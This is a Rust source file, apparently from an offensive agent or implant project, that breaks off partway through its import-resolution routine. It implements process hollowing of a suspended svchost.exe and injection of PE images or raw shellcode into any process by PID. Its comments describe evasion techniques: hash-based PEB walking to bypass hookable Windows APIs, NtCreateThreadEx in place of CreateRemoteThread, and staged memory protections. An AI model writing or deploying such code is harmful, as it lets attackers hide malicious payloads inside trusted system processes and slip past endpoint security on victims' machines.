use anyhow::{anyhow, Result};
#[cfg(windows)]
use winapi::ctypes::c_void;

/// Section descriptor for `rva_to_file_offset_sections` — platform-agnostic
/// so the conversion logic can be unit-tested without `#[cfg(windows)]`.
#[cfg(any(windows, test))]
#[derive(Clone, Copy)]
struct SectionDesc {
    virtual_address: usize,
    virtual_size: usize,
    raw_offset: usize,
}

/// Walk a slice of `SectionDesc` entries and convert `rva` to a raw file offset.
///
/// Returns `rva` unchanged when no section contains it (header area, which maps
/// 1:1 for PE files with `SizeOfHeaders` bytes of header data).
#[cfg(any(windows, test))]
fn rva_to_file_offset_sections(rva: usize, sections: &[SectionDesc]) -> usize {
    for sec in sections {
        if rva >= sec.virtual_address && rva < sec.virtual_address + sec.virtual_size {
            return rva - sec.virtual_address + sec.raw_offset;
        }
    }
    // Fallback: header area (rva < SizeOfHeaders) maps 1:1.
    rva
}

/// Convert a Relative Virtual Address (RVA) from the PE optional-header data
/// directories to a raw file offset by walking the section table.
///
/// The data-directory fields (e.g. `IMAGE_DIRECTORY_ENTRY_BASERELOC`,
/// `IMAGE_DIRECTORY_ENTRY_IMPORT`) store *virtual* addresses relative to the
/// image base, **not** offsets into the on-disk file.  Using an RVA directly
/// as a file offset is only accidentally correct for packed/aligned images
/// where `VirtualAddress == PointerToRawData`.  For general PE files the two
/// values differ and we must walk the section headers.
///
/// # Safety
///
/// `nt` must point to a valid, fully-mapped `IMAGE_NT_HEADERS64` structure.
/// The section headers immediately following it must also be valid and in-bounds.
#[cfg(windows)]
unsafe fn rva_to_file_offset(
    rva: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
) -> usize {
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    let descs: Vec<SectionDesc> = (0..num_sections)
        .map(|i| {
            let sec = &*first.add(i);
            SectionDesc {
                virtual_address: sec.VirtualAddress as usize,
                virtual_size: *sec.Misc.VirtualSize() as usize,
                raw_offset: sec.PointerToRawData as usize,
            }
        })
        .collect();
    rva_to_file_offset_sections(rva, &descs)
}

/// M-26 Part E: load a DLL into our own process via `LdrLoadDll` (resolved via
/// PEB walk) instead of the hookable `LoadLibraryA` IAT entry. Returns 0 on
/// failure, in which case the caller leaves the corresponding IAT slot empty.
#[cfg(windows)]
unsafe fn ldr_load_local(dll_name: &str) -> usize {
    let ntdll = match pe_resolve::get_module_handle_by_hash(
        pe_resolve::hash_str(b"ntdll.dll\0"),
    ) {
        Some(b) => b,
        None => return 0,
    };
    let ldr_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"LdrLoadDll\0"),
    ) {
        Some(a) => a,
        None => return 0,
    };
    type LdrLoadDllFn = unsafe extern "system" fn(
        *mut u16,
        *mut u32,
        *mut winapi::shared::ntdef::UNICODE_STRING,
        *mut *mut winapi::ctypes::c_void,
    ) -> i32;
    let ldr_load_dll: LdrLoadDllFn = std::mem::transmute(ldr_addr as *const ());

    let wide: Vec<u16> = dll_name
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let mut us: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
    us.Length = ((wide.len().saturating_sub(1)) * 2) as u16;
    us.MaximumLength = (wide.len() * 2) as u16;
    us.Buffer = wide.as_ptr() as *mut _;
    let mut base_out: *mut winapi::ctypes::c_void = std::ptr::null_mut();
    let status = ldr_load_dll(
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut us,
        &mut base_out,
    );
    if status >= 0 {
        base_out as usize
    } else {
        0
    }
}

/// M-26 Part E: resolve an export by ordinal from a clean module image.
/// Mirrors `agent::syscalls::get_export_addr_by_ordinal` so the hollowing
/// crate doesn't need to depend on agent or call hooked GetProcAddress.
#[cfg(windows)]
unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut std::ffi::c_void {
    use std::ffi::CStr;

    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
        return std::ptr::null_mut();
    }
    let nt_headers = (base + (*dos_header).e_lfanew as usize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    let export_data_dir = (*nt_headers).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize];
    let export_dir_rva = export_data_dir.VirtualAddress;
    let export_dir_size = export_data_dir.Size as usize;
    if export_dir_rva == 0 {
        return std::ptr::null_mut();
    }
    let ed =
        (base + export_dir_rva as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
    let base_ordinal = (*ed).Base;
    let num_funcs = (*ed).NumberOfFunctions;
    let funcs = (base + (*ed).AddressOfFunctions as usize) as *const u32;
    if ordinal < base_ordinal {
        return std::ptr::null_mut();
    }
    let idx = (ordinal - base_ordinal) as usize;
    if idx >= num_funcs as usize {
        return std::ptr::null_mut();
    }
    let func_rva = *funcs.add(idx) as usize;
    if func_rva == 0 {
        return std::ptr::null_mut();
    }

    // Forwarder: RVA points inside export directory, so it is an ASCII
    // "DLL.Func" string rather than executable code.
    let export_start = export_dir_rva as usize;
    let export_end = export_start.saturating_add(export_dir_size);
    if func_rva >= export_start && func_rva < export_end {
        let forward_ptr = (base + func_rva) as *const i8;
        let forward = match CStr::from_ptr(forward_ptr).to_str() {
            Ok(s) => s,
            Err(_) => return std::ptr::null_mut(),
        };

        let (dll_part, symbol_part) = match forward.find('.') {
            Some(i) => (&forward[..i], &forward[i + 1..]),
            None => return std::ptr::null_mut(),
        };

        let dll_name = if dll_part.to_ascii_lowercase().ends_with(".dll") {
            dll_part.to_string()
        } else {
            format!("{}.dll", dll_part)
        };

        // Load forwarded target via ntdll!LdrLoadDll to avoid hookable
        // LoadLibraryA/GetProcAddress IAT paths.
        let loaded_base = ldr_load_local(&dll_name);
        if loaded_base == 0 {
            return std::ptr::null_mut();
        }

        let mut dll_name_nul = dll_name.as_bytes().to_vec();
        dll_name_nul.push(0);
        let dll_hash = pe_resolve::hash_str(&dll_name_nul);
        let hmod = pe_resolve::get_module_handle_by_hash(dll_hash).unwrap_or(loaded_base);
        if hmod == 0 {
            return std::ptr::null_mut();
        }

        if let Some(ord_str) = symbol_part.strip_prefix('#') {
            let ord = match ord_str.parse::<u16>() {
                Ok(v) => v,
                Err(_) => return std::ptr::null_mut(),
            };
            return local_get_export_addr_by_ordinal(hmod, ord as u32);
        }

        let mut symbol_nul = symbol_part.as_bytes().to_vec();
        symbol_nul.push(0);
        let symbol_hash = pe_resolve::hash_str(&symbol_nul);
        return pe_resolve::get_proc_address_by_hash(hmod, symbol_hash)
            .map(|a| a as *mut std::ffi::c_void)
            .unwrap_or(std::ptr::null_mut());
    }

    (base + func_rva) as *mut std::ffi::c_void
}

/// Hollow a new suspended svchost.exe process and execute the provided PE payload inside it.
#[cfg(windows)]
pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
    use std::mem::zeroed;
    use std::ptr::null_mut;
    use winapi::shared::basetsd::SIZE_T;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
    use winapi::um::processthreadsapi::{
        CreateProcessA, GetThreadContext, ResumeThread, SetThreadContext, PROCESS_INFORMATION,
        STARTUPINFOA,
    };
    use winapi::um::winbase::CREATE_SUSPENDED;
    use winapi::um::winnt::{
        CONTEXT, CONTEXT_FULL, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64,
        IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    };

    // Resolve NtClose once; fall back to CloseHandle if unavailable
    let nt_close_addr = unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).and_then(
            |base| pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0")),
        )
    };
    macro_rules! close_handle {
        ($h:expr) => {
            if let Some(addr) = nt_close_addr {
                type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
                let nt_close: NtCloseFn = std::mem::transmute(addr as *const ());
                nt_close($h);
            } else {
                CloseHandle($h);
            }
        };
    }

    if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
        return Err(anyhow!(
            "hollow_and_execute: payload is not a PE (no MZ header)"
        ));
    }

    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
    let e_lfanew = unsafe { (*dos).e_lfanew } as usize;
    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
        return Err(anyhow!("hollow_and_execute: PE too small for NT headers"));
    }
    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
    unsafe {
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid DOS signature"));
        }
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid NT signature"));
        }
        // Only PE64 (OptionalHeader Magic = 0x020B) is supported.  Reading
        // OptionalHeader fields through IMAGE_NT_HEADERS64 on a 32-bit PE
        // (Magic = 0x010B) would read from wrong offsets and produce garbage.
        let opt_magic = (*nt).OptionalHeader.Magic;
        if opt_magic != winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC {
            return Err(anyhow!(
                "hollow_and_execute: only PE64 payloads are supported (found OptionalHeader.Magic=0x{:x})",
                opt_magic
            ));
        }

        let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
        let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
        let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;

        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
        let host_path = format!("{}\\System32\\svchost.exe\0", sysroot);
        let host = host_path.as_bytes();
        let mut si: STARTUPINFOA = zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = zeroed();

        let ok = CreateProcessA(
            host.as_ptr() as _,
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        );
        if ok == 0 {
            return Err(anyhow!(
                "CreateProcessA failed: {}",
                winapi::um::errhandlingapi::GetLastError()
            ));
        }

        // NtUnmapViewOfSection to hollow the original image
        // Use PEB walk via pe_resolve instead of GetModuleHandleA/GetProcAddress (2.3)
        let ntdll_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                .unwrap_or(0);
        if ntdll_base == 0 {
            tracing::warn!("hollow_and_execute: ntdll base not found via PEB; original image will not be unmapped");
        } else {
            let unmap_addr = pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtUnmapViewOfSection\0"),
            )
            .unwrap_or(0);
            if unmap_addr == 0 {
                tracing::warn!(
                    "hollow_and_execute: NtUnmapViewOfSection not resolved; skipping unmap"
                );
            } else {
                type NtUnmapFn = extern "system" fn(*mut c_void, *mut c_void) -> i32;
                let nt_unmap: NtUnmapFn = std::mem::transmute(unmap_addr);

                let mut ctx: CONTEXT = zeroed();
                ctx.ContextFlags = CONTEXT_FULL;
                if GetThreadContext(pi.hThread, &mut ctx) == 0 {
                    tracing::warn!(
                        "hollow_and_execute: GetThreadContext failed ({}); skipping unmap",
                        winapi::um::errhandlingapi::GetLastError()
                    );
                } else {
                    // In a newly created x64 process, Rdx holds the PEB address
                    let peb_ptr = ctx.Rdx as *const u8;
                    let mut remote_image_base: usize = 0;
                    ReadProcessMemory(
                        pi.hProcess,
                        peb_ptr.add(0x10) as _,
                        &mut remote_image_base as *mut _ as _,
                        std::mem::size_of::<usize>(),
                        null_mut(),
                    );
                    if remote_image_base == 0 {
                        tracing::warn!(
                            "hollow_and_execute: remote_image_base is NULL; skipping unmap"
                        );
                    } else {
                        let unmap_status = nt_unmap(pi.hProcess, remote_image_base as _);
                        if unmap_status < 0 {
                            tracing::warn!("hollow_and_execute: NtUnmapViewOfSection returned 0x{:x}; continuing", unmap_status);
                        }
                    } // remote_image_base != 0
                } // GetThreadContext succeeded
            }
        }

        // Allocate with PAGE_READWRITE first; apply execute permission after writing (2.4)
        let remote_base_ptr = VirtualAllocEx(
            pi.hProcess,
            preferred_base as _,
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        let remote_base_ptr = if remote_base_ptr.is_null() {
            let fallback = VirtualAllocEx(
                pi.hProcess,
                null_mut(),
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if fallback.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                close_handle!(pi.hThread);
                close_handle!(pi.hProcess);
                return Err(anyhow!("VirtualAllocEx failed for hollowing"));
            }
            fallback
        } else {
            remote_base_ptr
        };

        let remote_base = remote_base_ptr as usize;
        let mut written: SIZE_T = 0;

        // Write PE headers
        if WriteProcessMemory(
            pi.hProcess,
            remote_base_ptr,
            payload.as_ptr() as _,
            (*nt).OptionalHeader.SizeOfHeaders as usize,
            &mut written,
        ) == 0
        {
            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
            close_handle!(pi.hThread);
            close_handle!(pi.hProcess);
            return Err(anyhow!("WriteProcessMemory(headers) failed"));
        }

        // Write sections
        let num_sections = (*nt).FileHeader.NumberOfSections as usize;
        let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
        for i in 0..num_sections {
            let sec = &*first_section.add(i);
            let raw_off = sec.PointerToRawData as usize;
            let raw_sz = sec.SizeOfRawData as usize;
            let virt_sz = *sec.Misc.VirtualSize() as usize;
            let copy_sz = raw_sz.min(virt_sz);
            // Skip BSS / zero-initialised sections: PointerToRawData == 0 means
            // there is no on-disk data for this section; the OS zero-fills it
            // from the VirtualAlloc.  Also skip if the copy size is zero.
            if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                continue;
            }
            let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
            if WriteProcessMemory(
                pi.hProcess,
                dst,
                payload.as_ptr().add(raw_off) as _,
                copy_sz,
                &mut written,
            ) == 0
            {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                close_handle!(pi.hThread);
                close_handle!(pi.hProcess);
                return Err(anyhow!("WriteProcessMemory(section {}) failed", i));
            }
        }

        let delta = remote_base as isize - preferred_base as isize;
        if delta != 0 {
            // Refuse to proceed if the PE has no relocation directory — applying
            // it at the wrong base without fixups will crash the hollowed process.
            let reloc_dir = &(*nt).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
            if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                close_handle!(pi.hThread);
                close_handle!(pi.hProcess);
                return Err(anyhow!("hollow_and_execute: VirtualAllocEx at preferred base failed and PE has no relocation directory; cannot fix up"));
            }
            apply_relocations_remote(pi.hProcess, remote_base, nt, payload, delta)?;
        }

        // Resolve and write the Import Address Table (2.2)
        fix_iat_remote(pi.hProcess, remote_base, nt, payload, &mut written)?;

        // Apply per-section memory protections now that the IAT has been written (2.4)
        apply_section_protections(pi.hProcess, remote_base, nt);

        // Flush the instruction cache for the entire mapped image so the CPU sees
        // the newly written code (L-04 fix).
        winapi::um::processthreadsapi::FlushInstructionCache(
            pi.hProcess,
            remote_base as *mut c_void,
            (*nt).OptionalHeader.SizeOfImage as usize,
        );

        // Update PEB.ImageBaseAddress
        let mut ctx: CONTEXT = zeroed();
        ctx.ContextFlags = CONTEXT_FULL;
        if GetThreadContext(pi.hThread, &mut ctx) == 0 {
            tracing::warn!(
                "hollow_and_execute: GetThreadContext failed before PEB image-base update ({}); skipping PEB write",
                winapi::um::errhandlingapi::GetLastError()
            );
        } else {
            let peb_ptr = ctx.Rdx as *const u8;
            WriteProcessMemory(
                pi.hProcess,
                peb_ptr.add(0x10) as _,
                &remote_base as *const _ as _,
                std::mem::size_of::<usize>(),
                &mut written,
            );
        }

        // Set new entry point (Rip, not Rcx — was 2.1 bug)
        ctx.Rip = (remote_base + entry_point_rva) as u64;
        if SetThreadContext(pi.hThread, &ctx) == 0 {
            tracing::warn!(
                "hollow_and_execute: SetThreadContext failed ({}); continuing",
                winapi::um::errhandlingapi::GetLastError()
            );
        }
        ResumeThread(pi.hThread);

        close_handle!(pi.hThread);
        close_handle!(pi.hProcess);
    }
    Ok(())
}

#[cfg(windows)]
unsafe fn apply_relocations_remote(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
    payload: &[u8],
    delta: isize,
) -> Result<()> {
    use winapi::shared::basetsd::SIZE_T;
    use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};

    let reloc_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
        return Ok(());
    }

    // Convert the relocation-directory RVA to a file offset.  The data-directory
    // VirtualAddress is a PE RVA, not a raw file offset; they differ when the
    // .reloc section has a different PointerToRawData than VirtualAddress.
    let reloc_file_off = rva_to_file_offset(reloc_dir.VirtualAddress as usize, nt);
    let reloc_end_off = reloc_file_off + reloc_dir.Size as usize;
    if reloc_end_off > payload.len() {
        return Ok(());
    }

    let mut offset = reloc_file_off;
    while offset + 8 <= reloc_end_off {
        let page_rva = u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
        let block_size =
            u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
        if block_size < 8 {
            break;
        }
        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > reloc_end_off {
                break;
            }
            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
            let typ = (entry >> 12) as u8;
            let rel = (entry & 0x0FFF) as usize;
            if typ == 10 {
                // IMAGE_REL_BASED_DIR64
                let target = (remote_base + page_rva + rel) as *mut c_void;
                let mut val: u64 = 0;
                let mut rd: SIZE_T = 0;
                ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 8, &mut rd);
                val = val.wrapping_add(delta as u64);
                let mut wr: SIZE_T = 0;
                WriteProcessMemory(hprocess, target, &val as *const _ as _, 8, &mut wr);
            }
        }
        offset += block_size;
    }
    Ok(())
}

/// Inject a PE or shellcode payload into an existing process identified by PID.
#[cfg(windows)]
pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
    use std::ptr::null_mut;
    use winapi::shared::basetsd::SIZE_T;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
    use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
    use winapi::um::winnt::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT,
        MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    unsafe {
        let hprocess = OpenProcess(
            PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_READ
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION,
            0,
            pid,
        );
        if hprocess.is_null() {
            return Err(anyhow!(
                "OpenProcess(pid={}) failed: {}",
                pid,
                winapi::um::errhandlingapi::GetLastError()
            ));
        }

        // Resolve NtClose for handle cleanup; fall back to CloseHandle
        let ntdll_base2 =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                .unwrap_or(0);
        let nt_close_addr2 = if ntdll_base2 != 0 {
            pe_resolve::get_proc_address_by_hash(ntdll_base2, pe_resolve::hash_str(b"NtClose\0"))
        } else {
            None
        };
        macro_rules! close_h {
            ($h:expr) => {
                if let Some(addr) = nt_close_addr2 {
                    type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
                    let f: NtCloseFn = std::mem::transmute(addr as *const ());
                    f($h);
                } else {
                    CloseHandle($h);
                }
            };
        }

        // Resolve NtCreateThreadEx via PEB walk to avoid hookable CreateRemoteThread
        let ntdll_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                .unwrap_or(0);
        if ntdll_base == 0 {
            close_h!(hprocess);
            return Err(anyhow!("inject_into_process: ntdll not found"));
        }
        let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtCreateThreadEx\0"),
        )
        .ok_or_else(|| anyhow!("inject_into_process: NtCreateThreadEx not found"))?;
        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut c_void,
            u32,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            u32,
            usize,
            usize,
            usize,
            *mut c_void,
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);

        // Determine if this is a PE image or raw shellcode
        let is_pe = payload.len() >= 64 && payload[0] == b'M' && payload[1] == b'Z';
        if is_pe {
            let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
            if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
                close_h!(hprocess);
                return Err(anyhow!("inject_into_process: invalid DOS magic"));
            }
            let nt =
                (payload.as_ptr() as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

            let nt_off = (*dos).e_lfanew as usize;
            if nt_off.saturating_add(std::mem::size_of::<IMAGE_NT_HEADERS64>()) > payload.len() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: e_lfanew ({nt_off:#x}) out of bounds for payload of {} bytes",
                    payload.len()
                ));
            }
            if (*nt).Signature != IMAGE_NT_SIGNATURE {
                close_h!(hprocess);
                return Err(anyhow!("inject_into_process: invalid NT signature"));
            }
            // Only PE64 (Magic = 0x020B) is supported.
            let opt_magic = (*nt).OptionalHeader.Magic;
            if opt_magic != winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: only PE64 payloads are supported (found Magic=0x{:x})",
                    opt_magic
                ));
            }

            let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
            let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
            let ep_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;

            // 4.1: Verify the PE can be relocated if we cannot map at its preferred
            // base.  A PE without a relocation directory (.reloc section / reloc
            // DataDirectory) that is loaded at a different address will have all
            // absolute addresses broken — refuse to inject rather than inject
            // silently broken code.
            let reloc_dir = (*nt).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
            let has_relocs = reloc_dir.VirtualAddress != 0 && reloc_dir.Size != 0;

            let remote_mem = VirtualAllocEx(
                hprocess,
                preferred_base as _,
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            let remote_mem = if remote_mem.is_null() {
                if !has_relocs {
                    // Cannot load at preferred base and there is no reloc table.
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process(pid={}): PE has no relocation directory and preferred \
                         base 0x{:x} is not available; cannot load at an alternative address",
                        pid, preferred_base
                    ));
                }
                VirtualAllocEx(
                    hprocess,
                    null_mut(),
                    image_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                )
            } else {
                remote_mem
            };

            if remote_mem.is_null() {
                close_h!(hprocess);
                return Err(anyhow!("VirtualAllocEx(pid={}) failed", pid));
            }

            let remote_base = remote_mem as usize;
            let mut written: SIZE_T = 0;
            WriteProcessMemory(
                hprocess,
                remote_mem,
                payload.as_ptr() as _,
                (*nt).OptionalHeader.SizeOfHeaders as usize,
                &mut written,
            );

            let num_sections = (*nt).FileHeader.NumberOfSections as usize;
            let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
                as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
            for i in 0..num_sections {
                let sec = &*first_section.add(i);
                let raw_off = sec.PointerToRawData as usize;
                let raw_sz = sec.SizeOfRawData as usize;
                let virt_sz = *sec.Misc.VirtualSize() as usize;
                let copy_sz = raw_sz.min(virt_sz);
                if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                    continue;
                }
                let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
                WriteProcessMemory(
                    hprocess,
                    dst,
                    payload.as_ptr().add(raw_off) as _,
                    copy_sz,
                    &mut written,
                );
            }

            let delta = remote_base as isize - preferred_base as isize;
            if delta != 0 {
                apply_relocations_remote(hprocess, remote_base, nt, payload, delta)?;
            }

            // Resolve IAT while memory is still writable (2.2)
            fix_iat_remote(hprocess, remote_base, nt, payload, &mut written)?;

            // Apply per-section protections after writing (2.4)
            apply_section_protections(hprocess, remote_base, nt);

            // Flush the instruction cache for the entire mapped image so the
            // CPU sees the newly-written code (L-04 fix).
            FlushInstructionCache(hprocess, remote_mem as *mut c_void, image_size);
            let entry = (remote_base + ep_rva) as *mut c_void;
            let mut h_thread: *mut c_void = null_mut();
            let status = nt_create_thread(
                &mut h_thread,
                0x1FFFFF,
                null_mut(),
                hprocess,
                entry,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );
            if status < 0 || h_thread.is_null() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtCreateThreadEx(pid={}) failed: {:x}",
                    pid,
                    status
                ));
            }
            close_h!(h_thread);
        } else {
            // Shellcode injection — allocate RW, write, protect RX, then thread
            let remote_mem = VirtualAllocEx(
                hprocess,
                null_mut(),
                payload.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if remote_mem.is_null() {
                close_h!(hprocess);
                return Err(anyhow!("VirtualAllocEx(shellcode, pid={}) failed", pid));
            }
            let mut written: SIZE_T = 0;
            WriteProcessMemory(
                hprocess,
                remote_mem,
                payload.as_ptr() as _,
                payload.len(),
                &mut written,
            );
            let mut old_prot = 0u32;
            VirtualProtectEx(
                hprocess,
                remote_mem,
                payload.len(),
                PAGE_EXECUTE_READ,
                &mut old_prot,
            );
            // Flush I-cache before redirecting execution into the newly-written
            // shellcode (L-04 fix).
            FlushInstructionCache(hprocess, remote_mem, payload.len());
            let mut h_sc_thread: *mut c_void = null_mut();
            let sc_status = nt_create_thread(
                &mut h_sc_thread,
                0x1FFFFF,
                null_mut(),
                hprocess,
                remote_mem,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );
            if sc_status < 0 || h_sc_thread.is_null() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtCreateThreadEx(shellcode, pid={}) failed: {:x}",
                    pid,
                    sc_status
                ));
            }
            close_h!(h_sc_thread);
        }

        close_h!(hprocess);
    }
    Ok(())
}

/// Resolve each imported function in the payload's IAT and write addresses into
/// the remote process (2.2).  DLL addresses are resolved in the injector's own
/// address space — valid because system DLLs share ASLR offsets session-wide.
#[cfg(windows)]
unsafe fn fix_iat_remote(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
    payload: &[u8],
    written: &mut winapi::shared::basetsd::SIZE_T,
) -> Result<()> {
    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
    use winapi::um::processthreadsapi::{GetThreadContext, ResumeThread, SetThreadContext};
    use winapi::um::synchapi::WaitForSingleObject;
    use winapi::um::winbase::INFINITE;
    use winapi::um::winnt::{CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE};

    // Resolve NtCreateThreadEx once for remote DLL loading (L-01/L-02 fix).
    let ntdll_base =
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).unwrap_or(0);
    let ntcreate_opt = if ntdll_base != 0 {
        pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtCreateThreadEx\0"),
        )
    } else {
        None
    };
    type NtCreateThreadExFn = unsafe extern "system" fn(
        *mut *mut c_void,
        u32,
        *mut c_void,
        *mut c_void,
        *mut c_void,
        *mut c_void,
        u32,
        usize,
        usize,
        usize,
        *mut c_void,
    ) -> i32;

    // LdrLoadDll address (used as the remote thread start routine).
    let ldr_load_dll_addr = if ntdll_base != 0 {
        pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"LdrLoadDll\0"))
    } else {
        None
    };

    let import_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress == 0 {
        return Ok(());
    }

    // Convert import-directory RVA to file offset.  Each field in the import
    // descriptor (OriginalFirstThunk, Name, FirstThunk) is also an RVA and
    // must be converted before using it as a payload index.
    let mut desc_off = rva_to_file_offset(import_dir.VirtualAddress as usize, nt);
    loop {
